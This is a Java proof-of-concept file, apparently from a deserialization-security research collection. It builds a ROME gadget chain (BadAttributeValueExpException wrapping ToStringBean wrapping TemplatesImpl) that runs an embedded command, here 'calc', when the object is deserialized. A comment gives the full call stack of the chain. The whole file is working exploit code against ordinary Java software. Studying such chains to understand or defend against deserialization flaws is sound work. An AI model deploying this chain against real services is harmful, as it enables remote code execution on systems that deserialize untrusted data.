package com.javasec.pocs.rome;

import com.javasec.utils.SerializeUtils;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

/**
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * toString:137, ToStringBean (com.sun.syndication.feed.impl)
 * toString:116, ToStringBean (com.sun.syndication.feed.impl)
 * readObject:86, BadAttributeValueExpException (javax.management)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:48, SerializeUtils (com.javasec.utils)
 * deserTester:264, SerializeUtils (com.javasec.utils)
 * main:15, BAC (com.javasec.pocs.rome)
 */
public class BAC {
    public static void main(String[] args) throws Exception {
        Templates templates = SerializeUtils.getTemplate("calc");
        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("pop");
        SerializeUtils.setFieldValue(badAttributeValueExpException,"val",toStringBean);
        SerializeUtils.deserTester(badAttributeValueExpException);
    }
}
